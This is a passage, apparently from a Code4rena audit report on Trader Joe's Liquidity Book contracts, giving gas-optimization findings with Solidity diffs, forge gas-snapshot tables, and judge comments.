Difference\ntestSetLBPairImplementation(),-460002,-2.742%\ntestConstructor(uint16,uint16,uint16,uint16,uint16,uint24,uint16,uint24),-153429,-3.014%\ntestGetSwapInOverflowReverts(),-67031,-9.004%\ntestGetSwapOutWithMultipleChoices(),-427507,-10.436%\ntestOracleSampleFromWith2Samples(),-67031,-12.911%\ntestSwapYtoXSingleBinFromGetSwapIn(),-66966,-13.118%\ntestSwapYtoXSingleBinFromGetSwapOut(),-67031,-13.449%\ntestSwapXtoYSingleBinFromGetSwapOut(),-67031,-13.450%\ntestSwapXtoYSingleBinFromGetSwapIn(),-67031,-13.501%\ntestOracleSampleFromEdgeCases(),-67009,-13.970%\ntestFuzzingAddLiquidity(uint256),-157150,-15.139%\ntestDistributionOverflowReverts(),-134018,-15.454%\ntestOracleSampleFromWith100Samples(),-4487757,-17.917%\ntestClaimFeesComplex(uint256,uint256),-247423,-18.921%\ntestForIdSlippageCaughtReverts(),-427485,-19.194%\ntestClaimProtocolFees(),-247401,-19.862%\ntestClaimFeesY(),-247335,-20.163%\ntestClaimFeesX(),-247335,-20.163%\ntestFeesOnTokenTransfer(),-284146,-20.361%\ntestSwapWithDifferentBinSteps(),-427529,-20.375%\ntestForAmountSlippageCaughtReverts(),-473364,-21.279%\ntestGetSwapInWrongAmountsReverts(),-427485,-21.326%\ntestFlawedCompositionFactor(),-359365,-21.362%\ntestGetSwapInMoreBins(),-427031,-21.706%\ntestInsufficientLiquidityMinted(),-359321,-21.806%\ntestGetSwapOutOnComplexRoute(),-427464,-22.719%\ntestGetSwapInOnComplexRoute(),-427507,-22.968%\ntestOracleSampleFromWith100SamplesNotAllInitialized(),-4484457,-22.991%\ntestAddLiquidityIgnored(),-428376,-23.297%\ntestGetSwapInWithMultipleChoices(),-427507,-23.756%\ntestSwapYtoXDistantBinsFromGetSwapOut(),-427421,-23.911%\ntestSwapYtoXDistantBinsFromGetSwapIn(),-427421,-23.933%\ntestBalanceOfBatch(),-256383,-24.074%\ntestFeeOnActiveBinReverse(),-213936,-24.331%\ntestFeeOnActiveBin(),-213936,-24.331%\ntestSwapXtoYDistantBinsFromGetSwapOut(),-427486,-24.412%\ntestSafeBatchTransferNotApprovedReverts(),-256343,-24.420%\ntestSwapXtoYDistantBinsFromGetSwapIn(),-427486,-24.425%\ntestSafeTransferNotApprovedReverts(),-256376,-24.488%\ntestFlashloan(),-427513,-24.826%\ntestSwapXtoYConsecutiveBinFromGetSwapOut(),-427486,-25.050%\ntestSwapXtoYConsecutiveBinFromGetSwapIn(),-427486,-25.064%\ntestSwapYtoXConsecutiveBinFromGetSwapOut(),-427486,-25.089%\ntestSwapYtoXConsecutiveBinFromGetSwapIn(),-427486,-25.104%\ntestBurnLiquidity(),-477535,-25.129%\ntestSafeTransferFrom(),-295891,-25.295%\ntestGetSwapOutOnV2Pair(),-427507,-26.931%\ntestGetSwapInOnV2Pair(),-427507,-26.953%\ntestSweepLBToken(),-489987,-27.188%\ntestModifierCheckLength(),-535964,-28.163%\ntestSafeTransferFromReverts(),-537662,-28.222%\ntestForceDecay(),-2319546,-28.916%\ntestSafeBatchTransferFromReverts(),-606907,-29.824%\ntestAddLiquidityTaxToken(),-1076244,-29.978%\ntestTLowerThanTimestamp(),-2319913,-30.143%\ntestRemoveLiquidityReverseOrder(),-709108,-33.958%\ntestAddLiquidityNoSlippage(),-709107,-33.960%\ntestAddLiquidityAVAXReversed(),-1608674,-35.141%\ntestAddLiquidityAVAX(),-1758599,-35.555%\ntestSafeBatchTransferFrom(),-570685,-36.100%\ntestRemoveLiquiditySlippageReverts(),-2670446,-42.380%\ntestInternalBurn(uint256,uint256),-67156,-53.633%\ntestInternalMint(uint256),-67231,-55.603%\ntestInternalExcessiveBurnAmountReverts(uint128,uint128),-66987,-56.306%\nOverall,-39447398,-1550.248%\n```\n\nNote that there are other instances of enumeration in the protocol. However, they only cost gas in admin functions or during pair creation. Also they enumerate addresses. Therefore I believe them to be justified, hence I only focused on enumeration of this core protocol functionality (adding and removing liquidity). I think it is essential to remove this enumeration to improve the efficiency of the protocol. Reducing gas cost during adding or removing liquidity is of utmost importance for the optimization of this protocol, as it will make it feasible to do bin operations at greater scale.\n\n## [G-02] Using Solidity version 0.8.17 will provide an overall gas optimization\n\nUsing at least `0.8.10` will save gas due to skipped `extcodesize` check if there is a return value. Currently the contracts are compiled using version `0.8.7` (Foundry default). It is easily changeable to `0.8.17` using the command `sed -i 's/0\\.8\\.7/^0.8.0/' test/*.sol && sed -i '4isolc = \"0.8.17\"' foundry.toml`. This will have the following total savings obtained by `forge snapshot --diff | tail -1`:\n\n```csv\nTest Function,Gas Cost Difference,Percent Difference\nOverall,-582995,-88.032%\n```\n\n## [G-03] Ternary operation is cheaper than if-else statement\n\nThere are instances where a ternary operation can be used instead of if-else statement. In these cases, using ternary operation will save modest amounts of gas.\n\n```diff\ndiff --git a/src/libraries/BitMath.sol b/src/libraries/BitMath.sol\nindex d088fdf..29c4034 100644\n--- a/src/libraries/BitMath.sol\n+++ b/src/libraries/BitMath.sol\n@@ -16,9 +16,7 @@ library BitMath {\n         uint8 _bit,\n         bool _rightSide\n     ) internal pure returns (uint256) {\n-        if (_rightSide) {\n-            return closestBitRight(_integer, _bit - 1);\n-        } else return closestBitLeft(_integer, _bit + 1);\n+        return _rightSide ? closestBitRight(_integer, _bit - 1) : closestBitLeft(_integer, _bit + 1);\n     }\n\n     /// @notice Returns the most (or least) significant bit of `_integer`\n@@ -26,9 +24,7 @@ library BitMath {\n     /// @param _isMostSignificant Whether we want the most (true) or the least (false) significant bit\n     /// @return The index of the most (or least) significant bit\n     function significantBit(uint256 _integer, bool _isMostSignificant) internal pure returns (uint8) {\n-        if (_isMostSignificant) {\n-            return mostSignificantBit(_integer);\n-        } else return leastSignificantBit(_integer);\n+        return _isMostSignificant ? mostSignificantBit(_integer) : leastSignificantBit(_integer);\n     }\n\n     /// @notice Returns the index of the closest bit on the right of x that is non null\n@@ -41,10 +37,8 @@ library BitMath {\n             uint256 _shift = 255 - bit;\n             x <<= _shift;\n\n-            if (x == 0) return type(uint256).max;\n-\n-            // can't overflow as it's non-zero and we shifted it by `_shift`\n-            return mostSignificantBit(x) - _shift;\n+            // can't underflow as it's non-zero and we shifted it by `_shift`\n+            return (x == 0) ? type(uint256).max : mostSignificantBit(x) - _shift;\n         }\n     }\n\n@@ -57,9 +51,7 @@ library BitMath {\n         unchecked {\n             x >>= bit;\n\n-            if (x == 0) return type(uint256).max;\n-\n-            return leastSignificantBit(x) + bit;\n+            return (x == 0) ? type(uint256).max : leastSignificantBit(x) + bit;\n         }\n     }\n```\n\nNote that this optimization seems to be dependent on usage of a more recent Solidity version. The following gas savings are on version `0.8.17`.\n\n```csv\nTest Function,Gas Cost Difference,Percent Difference\nOverall,-13065,-0.200%\n```\n\n## [G-04] Checking `msg.sender` to not be zero address is redundant\n\nThere is an instance where `msg.sender` is checked not to be zero address. This check is redundant as no private key is known for this address, hence there can be no transactions coming from the zero address. The following diff removes this redundant check.\n\n```diff\ndiff --git a/src/libraries/PendingOwnable.sol b/src/libraries/PendingOwnable.sol\nindex f745362..97fb524 100644\n--- a/src/libraries/PendingOwnable.sol\n+++ b/src/libraries/PendingOwnable.sol\n@@ -33,7 +33,7 @@ contract PendingOwnable is IPendingOwnable {\n\n     /// @notice Throws if called by any account other than the pending owner.\n     modifier onlyPendingOwner() {\n-        if (msg.sender != _pendingOwner || msg.sender == address(0)) revert PendingOwnable__NotPendingOwner();\n+        if (msg.sender != _pendingOwner) revert PendingOwnable__NotPendingOwner();\n         _;\n     }\n\n```\n\nThis will save tiny amounts of gas when `PendingOwnable.becomeOwner()` is called.\n\n## [G-05] An element is cached to memory after it is used\n\nCaching a struct element locally should be done before using it to save gas. The following diff applies this optimization.\n\n```diff\ndiff --git a/src/LBPair.sol b/src/LBPair.sol\nindex 717270e..1d29c39 100644\n--- a/src/LBPair.sol\n+++ b/src/LBPair.sol\n@@ -316,8 +316,8 @@ contract LBPair is LBToken, ReentrancyGuardUpgradeable, ILBPair {\n         if (_amountIn == 0) revert LBPair__InsufficientAmounts();\n\n         FeeHelper.FeeParameters memory _fp = _feeParameters;\n-        _fp.updateVariableFeeParameters(_pair.activeId);\n         uint256 _startId = _pair.activeId;\n+        _fp.updateVariableFeeParameters(_startId);\n\n         uint256 _amountOut;\n         // Performs the actual swap, bin per bin\n```\n\nThis will save small amount of gas when swapping.\n\n```csv\nTest Function,Gas Cost Difference,Percent Difference\ntestSwapExactTokensForTokensSinglePair(),-30,-0.009%\n```\n\n## [G-06] Divisions by `2**n` can be replaced by right shift by `n`\n\nThere is an instance of division by `2`, which can be replaced by right shift by `1`. This simple bit operation is always cheaper than division. The following diff applies this optimization.\n\n```diff\ndiff --git a/src/libraries/Oracle.sol b/src/libraries/Oracle.sol\nindex 974bc9f..fd9ca64 100644\n--- a/src/libraries/Oracle.sol\n+++ b/src/libraries/Oracle.sol\n@@ -159,7 +159,7 @@ library Oracle {\n         uint256 _sampleTimestamp;\n         while (_high >= _low) {\n             unchecked {\n-                _middle = (_low + _high) / 2;\n+                _middle = (_low + _high) >> 1;\n                 assembly {\n                     _id := addmod(_middle, _index, _activeSize)\n                 }\n```\n\nGas savings are obtained by `forge snapshot --diff`.\n\n```csv\nTest Function,Gas Cost Difference,Percent Difference\ntestOracleSampleFromWith2Samples(),-4,-0.001%\ntestOracleSampleFromWith100SamplesNotAllInitialized(),-452,-0.002%\ntestFuzzingAddLiquidity(uint256),30,0.003%\ntestOracleSampleFromWith100Samples(),-1320,-0.005%\nOverall,-1746,-0.005%\n```\n\n## [G-07] Runtime cost can be optimized in detriment of the deploy cost\n\nThere are two optimization to improve runtime cost. Although the following optimizations will increase the gas cost of new pair creation and certain admin functions, it will decrease runtime cost of core protocol functions (swap, add/remove liquidity). Given that a pair is created once, but thousands of operations are made on it, optimizing for runtime can save a lot of gas in the long term.\n\n### [G-07A] Storing `LBFactory._LBPairsInfo` info in both sorting order will save gas in runtime\n\nWhen `LBFactory.createLBPair()` is called, the pair information can be stored in both sorting orders of its reserve tokens. This will allow skipping [`_sortTokens()`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L607-L611), reducing the gas cost of [`_getLBPairInformation()`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L593-L600).\n\n```diff\ndiff --git a/src/LBFactory.sol b/src/LBFactory.sol\nindex 32ee39c..7c66fbf 100644\n--- a/src/LBFactory.sol\n+++ b/src/LBFactory.sol\n@@ -183,9 +183,7 @@ contract LBFactory is PendingOwnable, ILBFactory {\n         returns (LBPairInformation[] memory LBPairsAvailable)\n     {\n         unchecked {\n-            (IERC20 _tokenA, IERC20 _tokenB) = _sortTokens(_tokenX, _tokenY);\n-\n-            bytes32 _avLBPairBinSteps = _availableLBPairBinSteps[_tokenA][_tokenB];\n+            bytes32 _avLBPairBinSteps = _availableLBPairBinSteps[_tokenX][_tokenY];\n             uint256 _nbAvailable = _avLBPairBinSteps.decode(type(uint8).max, 248);\n \n             if (_nbAvailable > 0) {\n@@ -194,7 +192,7 @@ contract LBFactory is PendingOwnable, ILBFactory {\n                 uint256 _index;\n                 for (uint256 i = MIN_BIN_STEP; i <= MAX_BIN_STEP; ++i) {\n                     if (_avLBPairBinSteps.decode(1, i) == 1) {\n-                        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][i];\n+                        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenX][_tokenY][i];\n \n                         LBPairsAvailable[_index] = LBPairInformation({\n                             binStep: i.safe24(),\n@@ -273,6 +271,12 @@ contract LBFactory is PendingOwnable, ILBFactory {\n             createdByOwner: msg.sender == _owner,\n             ignoredForRouting: false\n         });\n+        _LBPairsInfo[_tokenB][_tokenA][_binStep] = LBPairInformation({\n+            binStep: _binStep,\n+            LBPair: _LBPair,\n+            createdByOwner: msg.sender == _owner,\n+            ignoredForRouting: false\n+        });\n \n         allLBPairs.push(_LBPair);\n \n@@ -286,6 +290,7 @@ contract LBFactory is PendingOwnable, ILBFactory {\n \n             // Save the changes\n             _availableLBPairBinSteps[_tokenA][_tokenB] = _avLBPairBinSteps;\n+            _availableLBPairBinSteps[_tokenB][_tokenA] = _avLBPairBinSteps;\n         }\n \n         emit LBPairCreated(_tokenX, _tokenY, _binStep, _LBPair, allLBPairs.length - 1);\n@@ -315,14 +320,13 @@ contract LBFactory is PendingOwnable, ILBFactory {\n         uint256 _binStep,\n         bool _ignored\n     ) external override onlyOwner {\n-        (IERC20 _tokenA, IERC20 _tokenB) = _sortTokens(_tokenX, _tokenY);\n-\n-        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][_binStep];\n+        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenX][_tokenY][_binStep];\n         if (address(_LBPairInformation.LBPair) == address(0)) revert LBFactory__AddressZero();\n \n         if (_LBPairInformation.ignoredForRouting == _ignored) revert LBFactory__LBPairIgnoredIsAlreadyInTheSameState();\n \n-        _LBPairsInfo[_tokenA][_tokenB][_binStep].ignoredForRouting = _ignored;\n+        _LBPairsInfo[_tokenX][_tokenY][_binStep].ignoredForRouting = _ignored;\n+        _LBPairsInfo[_tokenY][_tokenX][_binStep].ignoredForRouting = _ignored;\n \n         emit LBPairIgnoredStateChanged(_LBPairInformation.LBPair, _ignored);\n     }\n@@ -595,7 +599,6 @@ contract LBFactory is PendingOwnable, ILBFactory {\n         IERC20 _tokenB,\n         uint256 _binStep\n     ) private view returns (LBPairInformation memory) {\n-        (_tokenA, _tokenB) = _sortTokens(_tokenA, _tokenB);\n         return _LBPairsInfo[_tokenA][_tokenB][_binStep];\n     }\n \n```\n\n### [G-07B] Using CREATE2 is cheaper than Clones\n\nUsing clone contracts requires extra proxy call, increasing the cost of all pair functions. Using CREATE2, although will increase cost of pair creation, will make all pair interactions cheaper.\n\n## [G-08] Making constant variables private will save gas during deployment\n\nWhen constants are marked public, extra getter functions are created, increasing the deployment cost. Marking these functions private will decrease gas cost. One can still read these variables through the source code. If they need to be accessed by an external contract, a separate single getter function can be used to return all constants as a tuple. There [are four instances of public constants](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L25-L30).\n\n```solidity\nsrc/LBFactory.sol:25:    uint256 public constant override MAX_FEE = 0.1e18; // 10%\nsrc/LBFactory.sol:27:    uint256 public constant override MIN_BIN_STEP = 1; // 0.01%\nsrc/LBFactory.sol:28:    uint256 public constant override MAX_BIN_STEP = 100; // 1%, can't be greater than 247 for indexing reasons\nsrc/LBFactory.sol:30:    uint256 public constant override MAX_PROTOCOL_SHARE = 2_500; // 25%\n```\n\n## [G-09] Using `bool`s for storage incurs overhead\n\n*Credit: Description by [IllIllI000](https://gist.github.com/IllIllI000)*.\n\n        // Booleans are more expensive than uint256 or any type that takes up a full\n        // word because each write operation emits an extra SLOAD to first read the\n        // slot's contents, replace the bits taken up by the boolean, and then write\n        // back. This is the compiler's defense against contract upgrades and\n        // pointer aliasing, and it cannot be disabled.\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27><br>\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess ([**100 gas**](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past.\n\nThere are 2 instances of this issue:\n\n```solidity\nsrc/LBFactory.sol-38-    /// @notice Whether the createLBPair function is unlocked and can be called by anyone (true) or only by owner (false)\nsrc/LBFactory.sol:39:    bool public override creationUnlocked;\n--\nsrc/LBToken.sol-20-    /// @dev Mapping from account to spender approvals\nsrc/LBToken.sol:21:    mapping(address => mapping(address => bool)) private _spenderApprovals;\n```\n\n## [G‑10] Functions guaranteed to revert when called by normal users can be marked `payable`\n\n*Credit: Description by [IllIllI000](https://gist.github.com/IllIllI000)*.\n\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost\n\nThere are 14 instances of this:\n\n```solidity\nsrc/libraries/PendingOwnable.sol:59:    function setPendingOwner(address pendingOwner_) public override onlyOwner {\nsrc/libraries/PendingOwnable.sol:68:    function revokePendingOwner() public override onlyOwner {\nsrc/libraries/PendingOwnable.sol:84:    function renounceOwnership() public override onlyOwner {\nsrc/LBFactory.sol:215:    function setLBPairImplementation(address _LBPairImplementation) external override onlyOwner {\nsrc/LBFactory.sol:317:    ) external override onlyOwner {\nsrc/LBFactory.sol:350:    ) external override onlyOwner {\nsrc/LBFactory.sol:396:    function removePreset(uint16 _binStep) external override onlyOwner {\nsrc/LBFactory.sol:434:    ) external override onlyOwner {\nsrc/LBFactory.sol:468:    function setFeeRecipient(address _feeRecipient) external override onlyOwner {\nsrc/LBFactory.sol:474:    function setFlashLoanFee(uint256 _flashLoanFee) external override onlyOwner {\nsrc/LBFactory.sol:485:    function setFactoryLockedState(bool _locked) external override onlyOwner {\nsrc/LBFactory.sol:493:    function addQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {\nsrc/LBFactory.sol:502:    function removeQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {\nsrc/LBFactory.sol:520:    function forceDecay(ILBPair _LBPair) external override onlyOwner {\n```\n\n**[0x0Louis (Trader Joe) confirmed](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250#issuecomment-1309552327):**\n > **[G-01] Owner token enumeration is an extremely expensive operation but it is not essential to the protocol**<br>\n> I think awarding 20k would be too high vs the rest of the reports, but this should save on average 40k as it skips 2 SSTORE on fresh slots\n> \n> **[G-02] Using Solidity version 0.8.17 will provide an overall gas optimization**<br>\n> 1k\n> \n> Will temporarily award 21k as it's the one report that eliminated SLOADs vs less impactful refactorings\n\n**[shung (warden) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250#issuecomment-1310432431):**\n > G-01 recommendation was applied to the main repo: [traderjoe-xyz/joe-v2@b29b6bf](https://github.com/traderjoe-xyz/joe-v2/commit/b29b6bfbf9ac39ce3cd56a81404126204aaf07b5)\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250#issuecomment-1317684902):**\n > Will not use 20k to rate the rest of reports but because of exceptional finding am awarding this report the win.\n\n\n\n***\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}